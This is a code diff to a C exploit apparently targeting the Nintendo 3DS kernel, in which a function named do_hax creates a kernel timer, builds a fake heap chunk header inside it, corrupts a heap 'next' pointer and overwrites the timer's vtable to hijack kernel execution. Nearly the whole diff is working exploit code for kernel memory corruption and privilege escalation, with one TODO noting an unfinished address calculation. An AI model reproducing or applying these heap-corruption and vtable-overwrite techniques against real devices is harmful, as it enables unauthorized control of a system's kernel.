@@ -4,8 +4,24 @@
 #include <stdlib.h>
 #include <malloc.h>
 
-#define SLAB_HEAP ((void*) 0xFFF70000)
 #define PAGE_SIZE 0x1000
+
+typedef struct {
+    void* vtable;
+    u32 refCount;
+    u32 syncedThreads;
+    void* firstThreadNode;
+    void* lastThreadNode;
+    void* timerInterruptVtable;
+    void* interruptObject;
+    s64 suspendTime;
+    u8 timerEnabled;
+    u8 resetType;
+    u16 unused;
+    s64 interval;
+    s64 initial;
+    void* owner;
+} KTimer;
 
 typedef struct {
     u32 size;
@@ -113,21 +129,24 @@ static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset
 
 // Executes exploit.
 void do_hax() {
+    // Allow threads on core 1.
+    aptOpenSession();
+    APT_SetAppCpuTimeLimit(30);
+    aptCloseSession();
+
     // Create a timer, crafting a fake MemChunkHdr out of its data.
     Handle timer;
     u32 timerAddr;
     svcCreateTimerKAddr(&timer, 0, &timerAddr);
     svcSetTimer(timer, 0, 0);
 
+    KTimer* timerObj = (KTimer*) (timerAddr - 4);
+    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;
+
     // Debug output.
-    printf("Timer address: %08X\n", (int) timerAddr);
+    printf("Timer address: 0x%08X\n", (int) timerAddr);
 
-    // Allow threads on core 1.
-    aptOpenSession();
-    APT_SetAppCpuTimeLimit(30);
-    aptCloseSession();
-
-    // Prepare necessary info.
+    // Prepare memory details.
     u32 memAddr = __ctru_heap + __ctru_heap_size;
     u32 memSize = PAGE_SIZE * 2;
 
@@ -135,21 +154,20 @@ void do_hax() {
     map_raw_pages(memAddr, memSize);
 
     // Overwrite the header "next" pointer to our crafted MemChunkHdr within the timer.
-    ((MemChunkHdr*) memAddr)->next = (void*) (timerAddr + 0x20);
+    ((MemChunkHdr*) memAddr)->next = fakeHdr;
 
-    // Output post-overwrite control result.
-    printf("Post-overwrite control result: %08X\n", (int) control_res);
+    // Debug output.
+    printf("Post-overwrite control result: 0x%08X\n", (int) control_res);
 
     // Wait for memory mapping to complete.
     wait_map_complete();
 
-    // Output final control result.
-    printf("Final control result: %08X\n", (int) control_res);
+    // Debug output.
+    printf("Final control result: 0x%08X\n", (int) control_res);
 
     // Overwrite the timer's vtable with our own.
-    void*** vtablePtr = (void***) (memAddr + (timerAddr - (timerAddr & ~0xFFF)) - 4);
-    printf("vtable: %08X\n", (int) vtablePtr);
-
+    // TODO: This needs to be a kernel virtual address.
+    void*** vtablePtr = (void***) (memAddr + ((u32) timerObj - ((u32) timerObj & ~0xFFF)));
     *vtablePtr = vtable;
 
     // Free the timer.
